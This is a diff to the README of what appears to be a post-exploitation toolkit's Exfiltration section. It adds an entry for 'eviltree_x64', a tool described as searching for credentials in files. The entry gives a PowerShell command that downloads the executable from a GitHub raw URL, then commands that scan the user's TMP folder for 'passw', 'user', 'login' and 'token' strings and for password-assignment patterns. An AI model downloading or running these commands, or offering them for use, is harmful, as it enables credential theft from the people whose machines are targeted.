@@ -196,3 +196,22 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfilt
    Remark: Parameter -detail 'true' (verbose outputs) its available
    by invoking 'GeoCoordinateWatcher' Or 'ifconfig' API's functions.   
 ```
+
+<br />
+
+## eviltree_x64.exe
+
+|Cmdlet Name|Description|Privileges|Notes|
+|---|---|---|---|
+|eviltree_x64|Search credentials in files|UserLand|[eviltree_x64](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Eviltree1.png)<br />[eviltree_x64](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Eviltree2.png)|
+
+**download cmdLet:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/eviltree_x64.exe" -OutFile "eviltree_x64.exe"
+```
+
+**execute:**
+```powershell
+.\eviltree_x64.exe -r "$Env:TMP" -k "passw,user,login,token" -v -q
+.\eviltree_x64.exe -r "$Env:TMP" -x ".{0,3}passw.{0,3}[=]{1}.{0,18}" -v -q
+```
